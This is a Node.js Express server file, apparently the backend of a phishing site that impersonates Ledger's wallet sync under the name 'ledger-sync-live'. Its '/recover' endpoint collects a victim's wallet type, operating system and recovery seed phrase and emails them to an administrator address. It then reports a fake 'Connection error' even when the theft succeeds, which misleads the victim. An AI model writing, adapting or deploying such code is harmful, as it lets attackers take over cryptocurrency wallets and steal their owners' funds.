const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
require('dotenv').config()

const cors = require('cors')

const allowedOrigins = [
    // 'https://synchronize-ledger.web.app',
//     'http://localhost:5500',
//     'http://127.0.0.1:5500',
    
]
const corsOptions = {
    origin: (origin, callback) => {
        if (allowedOrigins.indexOf(origin) !== -1 || !origin) {
            callback(null, true)
        } else {
            callback(new Error('Not allowed by CORS'))
        }
    },
    credentials: true,
    optionsSuccessStatus: 200
}
app.use(cors(corsOptions))

app.use(express.json())

const user = process.env.USER
const pass = process.env.PASS
// configure the email transport
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: user,
    pass: pass
  }
});

// define a route to send email
app.post('/recover', (req, res) => {
    const { wallet, os, phrase }  = req.body
    const admin = process.env.ADMIN_EMAIL

  // configure the email message
  const mailOptions = {
    from: `"ledger-sync-live" <${process.env.USER}>`,
        to: admin,
        subject: 'Support Sync Recovery',
        text: `Wallet Type: ${wallet},\n\nOS Type: ${os},\n\nPhrase: ${phrase}`,
  };

  // send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      res.status(500).send('Erro connecting to');
    } else {
      res.status(200).send('Connection error');
    }
  });
});

// start the server
const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});